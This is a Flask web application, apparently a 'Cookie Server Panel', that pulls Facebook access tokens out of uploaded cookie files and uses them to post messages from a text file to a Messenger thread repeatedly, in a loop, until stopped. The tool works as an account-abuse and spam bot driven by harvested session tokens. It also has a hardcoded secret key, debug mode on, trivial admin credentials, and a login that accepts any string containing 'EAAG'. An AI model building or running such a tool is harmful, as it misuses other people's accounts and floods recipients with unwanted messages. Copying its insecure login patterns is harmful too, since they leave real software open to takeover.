from flask import Flask, request, jsonify, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import uuid
import re

app = Flask(__name__)
app.secret_key = "super_secret_key_123"   # Change this in production!
app.debug = True

# Shared HTTP headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Active tasks
active_threads = {}

# --- Helper functions ---
def extract_token_from_cookie(cookie_string):
    token_match = re.search(r'EAAG\w+', cookie_string)
    if token_match:
        return token_match.group(0)
    return None


def send_messages(cookies, thread_id, mn, time_interval, messages, task_id):
    stop_event = active_threads[task_id]['event']

    access_tokens = []
    for cookie in cookies:
        token = extract_token_from_cookie(cookie)
        if token:
            access_tokens.append(token)

    if not access_tokens:
        print(f"Task {task_id}: No valid tokens found")
        if task_id in active_threads:
            del active_threads[task_id]
        return

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f'{mn} {message1}'
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Task {task_id}: Message sent using token {access_token[:10]}...")
                    else:
                        print(f"Task {task_id}: Failed - Status {response.status_code}")
                except Exception as e:
                    print(f"Task {task_id}: Error - {str(e)}")
                if not stop_event.is_set():
                    time.sleep(time_interval)

    if task_id in active_threads:
        del active_threads[task_id]
        print(f"Task {task_id}: stopped")


# --- API routes ---
@app.route('/start', methods=['POST'])
def start_messages():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    try:
        cookie_file = request.files['cookieFile']
        cookies = cookie_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = str(uuid.uuid4())
        stop_event = Event()

        thread = Thread(target=send_messages,
                        args=(cookies, thread_id, mn, time_interval, messages, task_id))

        active_threads[task_id] = {
            'thread': thread,
            'event': stop_event,
            'thread_id': thread_id,
            'start_time': time.time()
        }

        thread.start()
        return jsonify({'status': 'success', 'task_id': task_id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})


@app.route('/stop/<task_id>', methods=['POST'])
def stop_messages(task_id):
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    if task_id in active_threads:
        active_threads[task_id]['event'].set()
        return jsonify({'status': 'success', 'message': f'Stopping task {task_id}'})
    return jsonify({'status': 'error', 'message': 'Task not found'})


@app.route('/status', methods=['GET'])
def get_status():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    status = {}
    for task_id, info in active_threads.items():
        status[task_id] = {
            'thread_id': info['thread_id'],
            'running_time': int(time.time() - info['start_time']),
            'active': info['thread'].is_alive()
        }
    return jsonify(status)


# --- Login page ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login_type = request.form.get("login_type")

        if login_type == "username":
            username = request.form.get("username")
            password = request.form.get("password")
            twofa = request.form.get("twofa")
            if username == "admin" and password == "admin123" and twofa == "123456":
                session['logged_in'] = True
                return redirect(url_for("home"))
            else:
                return "<h3 style='color:red'>Invalid Username/Password/2FA</h3>" + login_html()

        elif login_type == "cookie":
            cookie = request.form.get("cookie")
            if "EAAG" in cookie:
                session['logged_in'] = True
                return redirect(url_for("home"))
            else:
                return "<h3 style='color:red'>Invalid Cookie</h3>" + login_html()

        elif login_type == "token":
            token = request.form.get("token")
            if token.startswith("EAAG"):
                session['logged_in'] = True
                return redirect(url_for("home"))
            else:
                return "<h3 style='color:red'>Invalid Token</h3>" + login_html()

    return login_html()


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for("login"))


def login_html():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>𝙈𝙐𝙇𝙏𝙄 𝙇𝙊𝙂𝙄𝙉 𝙎𝙔𝙎𝙏𝙈 𝘽𝙔 𝘼𝘼𝙔𝙐𝙎𝙃</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: linear-gradient(135deg, #ff6a00, #ee0979); font-family: Arial; color: white;
               height:100vh; display:flex; justify-content:center; align-items:center; margin:0; }
        .login-box { background: rgba(0,0,0,0.6); padding:30px; border-radius:15px; width:90%; max-width:400px;
                     box-shadow:0 0 20px rgba(255,255,255,0.4); text-align:center; }
        h1 { font-size: 20px; margin-bottom:20px; font-weight:bold; }
        input { width:100%; padding:12px; margin:8px 0; border:none; border-radius:8px; outline:none; }
        button { width:100%; padding:12px; margin:8px 0; border:none; border-radius:8px;
                 background: linear-gradient(45deg,#23a6d5,#23d5ab); color:white; font-size:16px; font-weight:bold; cursor:pointer; }
        button:hover { transform: scale(1.05); }
        .section { display:none; margin-top:15px; }
    </style>
    <script>
        function showSection(type){
            document.querySelectorAll('.section').forEach(s=>s.style.display='none');
            document.getElementById(type).style.display='block';
        }
    </script>
</head>
<body>
    <div class="login-box">
        <h1>𝙈𝙐𝙇𝙏𝙄 𝙇𝙊𝙂𝙄𝙉 𝙎𝙔𝙎𝙏𝙈 𝘽𝙔 𝘼𝘼𝙔𝙐𝙎𝙃</h1>
        <button onclick="showSection('username')">Login with Username</button>
        <button onclick="showSection('cookie')">Login with Cookie</button>
        <button onclick="showSection('token')">Login with Token</button>
        <form method="POST">
            <div id="username" class="section">
                <input type="hidden" name="login_type" value="username">
                <input type="text" name="username" placeholder="Enter Username" required>
                <input type="password" name="password" placeholder="Enter Password" required>
                <input type="text" name="twofa" placeholder="Enter 2FA Code" required>
                <button type="submit">Login</button>
            </div>
        </form>
        <form method="POST">
            <div id="cookie" class="section">
                <input type="hidden" name="login_type" value="cookie">
                <input type="text" name="cookie" placeholder="Paste Cookie" required>
                <button type="submit">Login</button>
            </div>
        </form>
        <form method="POST">
            <div id="token" class="section">
                <input type="hidden" name="login_type" value="token">
                <input type="text" name="token" placeholder="Paste Token" required>
                <button type="submit">Login</button>
            </div>
        </form>
    </div>
</body>
</html>
    '''


# --- Home page (Cookie Server Panel UI) ---
@app.route('/')
def home():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Cookie Server Panel</title>
    <style>
        body { font-family: Arial; background:#f2f2f2; padding:20px; }
        .container { background:white; padding:20px; border-radius:10px; max-width:600px; margin:auto; box-shadow:0 0 10px rgba(0,0,0,0.2); }
        h2 { text-align:center; color:#e60000; }
        input, button { width:100%; padding:10px; margin:8px 0; border-radius:5px; border:1px solid #ccc; }
        button { background:#28a745; color:white; font-weight:bold; cursor:pointer; }
        button:hover { background:#218838; }
        .logout { background:#dc3545; }
        .logout:hover { background:#c82333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Cookie Server Panel</h2>
        <a href="/logout"><button class="logout">Logout</button></a>
        <form id="startForm" enctype="multipart/form-data">
            <label>Upload Cookie File:</label>
            <input type="file" name="cookieFile" required>
            <label>Upload Message File:</label>
            <input type="file" name="txtFile" required>
            <label>Thread ID:</label>
            <input type="text" name="threadId" required>
            <label>Prefix (mn):</label>
            <input type="text" name="kidx" required>
            <label>Time Interval (sec):</label>
            <input type="number" name="time" required>
            <button type="submit">Start Task</button>
        </form>
        <div id="status"></div>
    </div>
    <script>
        document.getElementById("startForm").onsubmit = async (e)=>{
            e.preventDefault();
            let formData = new FormData(e.target);
            let res = await fetch("/start", { method:"POST", body:formData });
            let data = await res.json();
            document.getElementById("status").innerText = JSON.stringify(data);
        }
    </script>
</body>
</html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
